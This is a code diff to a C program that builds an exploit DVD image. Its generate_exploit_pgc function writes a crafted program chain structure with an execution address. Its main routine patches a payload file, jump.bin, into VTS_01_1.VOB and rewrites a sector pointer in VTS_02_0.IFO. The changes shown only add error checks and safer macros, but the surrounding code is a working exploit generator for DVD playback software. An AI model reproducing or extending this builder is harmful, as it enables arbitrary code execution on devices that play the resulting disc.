@@ -3,8 +3,8 @@
 #include <string.h>
 #include <stdlib.h>
 
-#define MIN(x, y) (x > y ? y : x)
-#define MAX(x, y) (x > y ? x : y)
+#define MIN(x, y) ((x) > (y) ? (y) : (x))
+#define MAX(x, y) ((x) > (y) ? (x) : (y))
 
 int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t eaddr) {
     pgc_t *pgc = (pgc_t *)calloc(1, sizeof(pgc_t));
@@ -14,7 +14,12 @@ int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t ea
     if (!pgc) {
         return -1;
     }
- 
+
+    if (!out_path) {
+        free(pgc);
+        return -1;
+    }
+
     for (int i = 0; i < 16; ++i) {
         pgc->pgc_gi.pgc_sp_plt[i] = 0x108080;
     }
@@ -84,9 +89,19 @@ int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t ea
         free(pgc_buf);
         return -1;
     }
-    fwrite(vts_pgci, 1, 16, fp);
+    if (fwrite(vts_pgci, 1, 16, fp) != 16) {
+        fclose(fp);
+        free(pgc);
+        free(pgc_buf);
+        return -1;
+    }
     fseek(fp, 16, SEEK_SET);
-    fwrite(pgc_buf, 1, pgc_buf_len, fp);
+    if (fwrite(pgc_buf, 1, pgc_buf_len, fp) != pgc_buf_len) {
+        fclose(fp);
+        free(pgc);
+        free(pgc_buf);
+        return -1;
+    }
     fclose(fp);
     free(pgc_buf);
     free(pgc);
@@ -115,6 +130,7 @@ int main() {
     printf("NEEDED_LEN: %x\n", NEEDED_LEN);
 
     if (generate_exploit_pgc("./build/fs/VIDEO_TS/VTS_02_0.BUP", CMDT_SA - 0x11e, NEEDED_LEN, EXEC_ADDR) < 0) {
+        fprintf(stderr, "Error: Failed to generate exploit PGC\n");
         return -1;
     }
 
@@ -138,41 +154,71 @@ int main() {
 
     FILE *fp = fopen("./build/jump.bin", "rb");
     if (!fp) {
+        fprintf(stderr, "Error: Failed to open jump.bin\n");
         return -1;
     }
     fseek(fp, 0, SEEK_END);
-    uint32_t payload_len = ftell(fp);
+    long file_size = ftell(fp);
+    if (file_size < 0) {
+        fprintf(stderr, "Error: Failed to get file size\n");
+        fclose(fp);
+        return -1;
+    }
+    uint32_t payload_len = (uint32_t)file_size;
     if (payload_len > 444) {
-        puts("payload truncated!");
+        printf("Warning: payload truncated from %u to 444 bytes!\n", payload_len);
         payload_len = 444;
     }
     fseek(fp, 0, SEEK_SET);
     uint8_t *payload = malloc(payload_len);
     if (!payload) {
+        fprintf(stderr, "Error: Failed to allocate memory for payload\n");
+        fclose(fp);
         return -1;
     }
-    fread(payload, 1, payload_len, fp);
+    if (fread(payload, 1, payload_len, fp) != payload_len) {
+        fprintf(stderr, "Error: Failed to read payload\n");
+        free(payload);
+        fclose(fp);
+        return -1;
+    }
     fclose(fp);
 
     fp = fopen("./build/fs/VIDEO_TS/VTS_01_1.VOB", "rb+");
     if (!fp) {
+        fprintf(stderr, "Error: Failed to open VTS_01_1.VOB\n");
         free(payload);
         return -1;
     }
 
     fseek(fp, VOB_PATCH_LOC, SEEK_SET);
-    fwrite(buf, 1, 24, fp);
+    if (fwrite(buf, 1, 24, fp) != 24) {
+        fprintf(stderr, "Error: Failed to write buffer to VOB\n");
+        free(payload);
+        fclose(fp);
+        return -1;
+    }
     fseek(fp, VOB_PATCH_LOC + 27, SEEK_SET);
-    fwrite(payload, 1, payload_len, fp);
+    if (fwrite(payload, 1, payload_len, fp) != payload_len) {
+        fprintf(stderr, "Error: Failed to write payload to VOB\n");
+        free(payload);
+        fclose(fp);
+        return -1;
+    }
     free(payload);
     fclose(fp);
 
     fp = fopen("./build/fs/VIDEO_TS/VTS_02_0.IFO", "rb+");
     if (!fp) {
+        fprintf(stderr, "Error: Failed to open VTS_02_0.IFO\n");
         return -1;
     }
     fseek(fp, IFO_PGC_PATCH_LOC, SEEK_SET);
-    fwrite(NEW_PGC_SECT, 1, 4, fp);
+    if (fwrite(NEW_PGC_SECT, 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
     fclose(fp);
 
     puts("OK");
